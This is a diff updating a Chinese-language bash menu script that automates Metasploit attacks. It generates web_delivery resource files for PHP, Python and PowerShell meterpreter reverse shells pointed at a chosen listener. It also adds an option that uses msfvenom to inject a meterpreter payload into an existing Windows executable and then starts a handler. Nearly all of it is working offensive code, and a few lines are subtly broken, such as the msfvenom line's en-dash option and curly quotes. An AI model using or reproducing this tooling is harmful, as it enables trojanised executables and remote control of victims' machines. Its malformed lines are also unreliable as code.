@@ -9,8 +9,8 @@
   echo -e '-- -- +=[(c) 2017 | www.ggsec.cn | www.secist.com | Demon '
 
   echo -e "/==========================########========================\\"
-  echo -e "|                             # v1.2                       |"
-  echo -e "|                         版本改进更新1.2                  |"
+  echo -e "|                             # v1.3                       |"
+  echo -e "|                         版本改进更新1.3                  |"
   echo -e "|                        #检查脚本中请稍等.........        |"
   echo -e "|———————————#—————————————————#——————————————————#—————————|"
   echo -e "|                                            Demon 2017    |"
@@ -55,6 +55,7 @@
   if [ "$msfvenom" == "0" ] ;then
   echo -e 'msfvenom      \e[0;31m【!!】 Not Found, first must be install metasploit\e[0m';
   fi
+  mkdir resource
   menu()
   {
   clear
@@ -65,7 +66,7 @@
   echo "|___/\___|\___|_|___/\__|___|___/\___|_|  |_| .__/ \__|"
   echo "        |_____|              |_|                      "
   echo "   "
-  echo "                                                 v  1.2 "
+  echo "                                                 v  1.3 "
 
   echo -e "/==========================########========================\\"
   echo -e "|               #我的博客www.ggsec.cn#                     |"
@@ -78,61 +79,90 @@
   echo "   "
   sleep 1
   echo "   "
-  echo "[1]  web_delivery(php)	           [2]  web_delivery(python)"
-  echo "[3]  web_delivery(powershell)      [4]  exit"
-  echo "[5]  About Me"
-  echo " "
   echo  "################################################################## "
-  echo -e "请选择你的payload: \c"
+  echo  "#   [1]  web_delivery(php)	       [2]  web_delivery(python) #"
+  echo  "#   [3]  web_delivery(powershell)      [4]  文件注入Payload      #"
+  echo  "#   [5]  exit                          [6]  About Me             #"
+  echo  "################################################################## "
+  echo ""
+  echo -e "secist> \c"
   read number
   case $number in
     1)
-    echo -e "请输入你的ip地址: \c"
+    echo -e "       secist>请输入你的ip地址: \c"
     read ip
-    echo -e "请输入你的端口: \c"
+    echo -e "       secist>请输入你的端口: \c"
     read port
     echo  "################################################################## "
-    echo "use exploit/multi/script/web_delivery" >> php.rc
-    echo "set PAYLOAD php/meterpreter/reverse_tcp" >> php.rc
-    echo "set TARGET 1" >> php.rc
-    echo "set LHOST $ip" >> php.rc
-    echo "set LPORT $port" >> php.rc
-    echo "set URIPATH /" >> php.rc
-    echo "run" >> php.rc
-    msfconsole -r php.rc
+    echo "use exploit/multi/script/web_delivery" >> resource/php.rc
+    echo "set PAYLOAD php/meterpreter/reverse_tcp" >> resource/php.rc
+    echo "set TARGET 1" >> resource/php.rc
+    echo "set LHOST $ip" >> resource/php.rc
+    echo "set LPORT $port" >> resource/php.rc
+    echo "set URIPATH /" >> resource/php.rc
+    echo "run" >> resource/php.rc
+    msfconsole -r resource/php.rc
         ;;
     2)
-    echo -e "请输入你的ip地址: \c"
+    echo -e "       secist>请输入你的ip地址: \c"
     read ip
-    echo -e "请输入你的端口: \c"
+    echo -e "        secist>请输入你的端口: \c"
     read port
     echo  "################################################################## "
-    echo "use exploit/multi/script/web_delivery" >> python.rc
-    echo "set LHOST $ip" >> python.rc
-    echo "set LPORT $port" >> python.rc
-    echo "set URIPATH /" >> python.rc
-    echo "run" >>python.rc
-    msfconsole -r python.rc
+    echo "use exploit/multi/script/web_delivery" >> resource/python.rc
+    echo "set LHOST $ip" >> resource/python.rc
+    echo "set LPORT $port" >> resource/python.rc
+    echo "set URIPATH /" >> resource/python.rc
+    echo "run" >>resource/python.rc
+    msfconsole -r resource/python.rc
         ;;
     3)
-    echo -e "请输入你的ip地址: \c"
+    echo -e "        secist>请输入你的ip地址: \c"
     read ip
-    echo -e "请输入你的端口: \c"
+    echo -e "        secist>请输入你的端口: \c"
     read port
     echo  "################################################################## "
-    echo "use exploit/multi/script/web_delivery" >> powershell.rc
-    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> powershell.rc
-    echo "set TARGET 2" >> powershell.rc
-    echo "set LHOST $ip" >> powershell.rc
-    echo "set LPORT $port" >> powershell.rc
-    echo "set URIPATH /" >> powershell.rc
-    echo "run" >> powershell.rc
-    msfconsole -r powershell.rc
+    echo "use exploit/multi/script/web_delivery" >> resource/powershell.rc
+    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >>resource/ powershell.rc
+    echo "set TARGET 2" >> resource/powershell.rc
+    echo "set LHOST $ip" >> resource/powershell.rc
+    echo "set LPORT $port" >> resource/powershell.rc
+    echo "set URIPATH /" >> resource/powershell.rc
+    echo "run" >> resource/powershell.rc
+    msfconsole -r resource/powershell.rc
     ;;
     4)
+    mkdir output
+    echo -e "         secist>请输入你的ip地址: \c"
+    read ip
+    echo -e "         secist>请输入你的端口: \c"
+    read port
+    echo -e "         secist>请输入你放入的文件名称: \c"
+    read file
+    echo -e "         secist>请输入你的保存的文件名称: \c"
+    read output
+    echo " 请稍等几分钟，您的烤鱼即将出炉========》"
+    echo  "################################################################## "
+    echo ""
+    sleep 2
+    meun2
+    msfvenom -a x86 --platform windows -x $file.exe -k -p windows/meterpreter/reverse_tcp  LHOST=$ip LPORT=$port –b “\ x00”  -f exe > output/$output.exe
+    sleep 1
+    echo -e "Do you start the payload handler? y or n: \c"
+    read handler
+    if [ "$handler" == "y" ]; then
+    echo "use exploit/multi/handler" >> resource/handler.rc
+    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/handler.rc
+    echo "set LHOST $ip" >>  resource/handler.rc
+    echo "set LPORT $port" >>  resource/handler.rc
+    echo "exploit " >>  resource/handler.rc
+    msfconsole -r  resource/handler.rc
+   fi
+    ;;
+    5)
         exit
         ;;
-    5)
+    6)
       menu1
       ;;
     *)
@@ -152,7 +182,8 @@ echo -e "    对课程内容有任何疑问，都可通过以下渠道与我们�
 echo -e "                     < My Blog: www.ggsec.cn >"
 echo -e "                    < My Team Blog: www.secist.com>"
 echo "                          即刻官方QQ 群：532925486 "
-echo "                           欢迎使用我的脚本 v1.2"
+echo "                           欢迎使用我的脚本 v1.3"
+echo "                         Ps:更改代码请注明原作者                             "
 echo -e "---------------------------------------------------------------------- "
 echo -e "                             \   ^__^             "
 echo -e "                              \  (oo)\_______     "
@@ -160,9 +191,12 @@ echo -e "                                 (__)\       )\/\ "
 echo -e "                                     ||----w |    "
 echo -e "                                     ||     ||     "
 echo "  "
-echo  "[1]back meun"
-echo  "[2]exit "
-echo -e "请输入序号：\c"
+echo  "################################################################## "
+echo  "#                           [1]back meun                          #"
+echo  "#                           [2]exit                               #"
+echo  "################################################################## "
+echo "  "
+echo -e "                         secist> \c"
 read number
 case $number in
 
@@ -178,8 +212,16 @@ case $number in
     esac
 
 }
-
+meun2 (){
+clear
+echo -e "  +------------++-------------------------++-----------------------+"
+echo -e "  | Name       ||  Descript   	          || Your Input              "
+echo -e "  +------------++-------------------------++-----------------------+"
+echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
+echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
+echo -e "  | OUTPUTNAME ||  The Filename output    || $output.exe            "
+echo -e "  +------------++-------------------------++-----------------------+"
+}
 menu
-rm php.rc
-rm python.rc
-rm powershell.rc
+rm -rf resource
+rm -rf output
